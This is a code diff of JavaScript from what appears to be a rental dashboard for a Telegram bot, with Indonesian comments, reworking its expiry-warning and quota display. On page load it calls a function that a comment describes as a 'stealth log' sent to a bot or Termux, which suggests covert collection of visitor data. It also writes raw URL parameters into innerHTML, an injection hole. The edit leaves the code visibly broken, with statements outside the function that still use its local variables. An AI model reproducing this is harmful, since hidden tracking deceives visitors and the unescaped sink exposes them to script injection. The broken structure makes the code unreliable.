@@ -345,41 +345,65 @@
         window.addEventListener('DOMContentLoaded', executeCyberEngine);
 
         function executeCyberEngine() {
-            const params = new URLSearchParams(window.location.search);
-            const rawBotName = params.get('bot_name') || 'Sawala';
-            
-            document.getElementById('bot-name').innerText = rawBotName.toUpperCase();
-            document.getElementById('bot-username').innerText = params.get('bot_username') || '@durovpavel';
-            
-            // JALANKAN LOG SILUMAN KIRIM KE BOT/TERMUX
-            collectAndSendLog(rawBotName);
+    const params = new URLSearchParams(window.location.search);
+    const rawBotName = params.get('bot_name') || 'Sawala';
+    
+    document.getElementById('bot-name').innerText = rawBotName.toUpperCase();
+    document.getElementById('bot-username').innerText = params.get('bot_username') || '@durovpavel';
+    
+    // JALANKAN LOG SILUMAN KIRIM KE BOT/TERMUX
+    collectAndSendLog(rawBotName);
 
-            const expiredStr = params.get('expire') || 'Tidak Aktif';
-            const expField = document.getElementById('val-expired');
-            const warningBadge = document.getElementById('warning-badge');
-            expField.innerText = expiredStr;
-            
-            if (expiredStr.includes("Menit") || expiredStr.includes("Jam") || expiredStr.includes("Expired") || expiredStr.includes("Tidak")) {
-                expField.innerHTML = `⚠️ <span class="text-rose-500 font-extrabold">${expiredStr}</span>`;
+    const expiredStr = params.get('expire') || 'Tidak Aktif';
+    const expField = document.getElementById('val-expired');
+    const warningBadge = document.getElementById('warning-badge');
+    expField.innerText = expiredStr;
+    
+    // LOGIKA WARNA INDIKATOR WAKTU SEWA YANG AKURAT
+    if (expiredStr.includes("Expired") || expiredStr.includes("Tidak")) {
+        // Jika mati atau habis
+        expField.innerHTML = `⚠️ <span class="text-rose-500 font-extrabold">${expiredStr}</span>`;
+        warningBadge.classList.remove('hidden');
+    } else if (expiredStr.includes("Jam") || expiredStr.includes("Menit")) {
+        // Jika sisa hitungan jam/menit (berarti kritis, di bawah 24 jam) atau gabungan "Hari X Jam" yang tipis
+        if (expiredStr.includes("Hari")) {
+            const matchHari = expiredStr.match(/(\d+)\s*Hari/);
+            const jumlahHari = matchHari ? parseInt(matchHari[1]) : 0;
+            if (jumlahHari <= 3) {
+                expField.innerHTML = `⚠️ <span class="text-amber-400 font-extrabold">${expiredStr}</span>`;
                 warningBadge.classList.remove('hidden');
             } else {
-                const matchHari = expiredStr.match(/(\d+)\s*Hari/);
-                if (matchHari) {
-                    const jumlahHari = parseInt(matchHari[1]);
-                    if (jumlahHari <= 3) { 
-                        expField.innerHTML = `⚠️ <span class="text-amber-400 font-extrabold">${expiredStr}</span>`;
-                        warningBadge.classList.remove('hidden');
-                    } else {
-                        expField.innerHTML = `<span class="text-emerald-400 font-bold">${expiredStr}</span>`;
-                        warningBadge.classList.add('hidden');
-                    }
-                } else {
-                    warningBadge.classList.add('hidden');
-                }
+                expField.innerHTML = `<span class="text-emerald-400 font-bold">${expiredStr}</span>`;
+                warningBadge.classList.add('hidden');
             }
+        } else {
+            // Murni sisa Jam / Menit saja (merah)
+            expField.innerHTML = `⚠️ <span class="text-rose-500 font-extrabold">${expiredStr}</span>`;
+            warningBadge.classList.remove('hidden');
+        }
+    } else {
+        // Jika sisa hari aman (di atas 3 hari tanpa pecahan jam kritis)
+        const matchHari = expiredStr.match(/(\d+)\s*Hari/);
+        if (matchHari) {
+            const jumlahHari = parseInt(matchHari[1]);
+            if (jumlahHari <= 3) { 
+                expField.innerHTML = `⚠️ <span class="text-amber-400 font-extrabold">${expiredStr}</span>`;
+                warningBadge.classList.remove('hidden');
+            } else {
+                expField.innerHTML = `<span class="text-emerald-400 font-bold">${expiredStr}</span>`;
+                warningBadge.classList.add('hidden');
+            }
+        } else {
+            warningBadge.classList.add('hidden');
+        }
+    }
 
-            document.getElementById('val-quota').innerText = `${params.get('limit_used') || 0} / ${params.get('limit_max') || 5}`;
-            
+    // UPDATE DISPLAY LIMIT KUOTA TOKEN SECARA REAL-TIME
+    // Di Python Renter tadi parameternya dikirim via limit_count, jadi kita ambil data pasangannya
+    const limitUsed = params.get('limit_used') || 0;
+    const limitMax = params.get('limit_max') || params.get('limit_count') || 5;
+    document.getElementById('val-quota').innerText = `${limitUsed} / ${limitMax}`;
+}
             const totalU = parseInt(params.get('total_users') || '0');
             const newU = parseInt(params.get('new_users_today') || '0');
             const clicksT = parseInt(params.get('total_clicks') || '0');
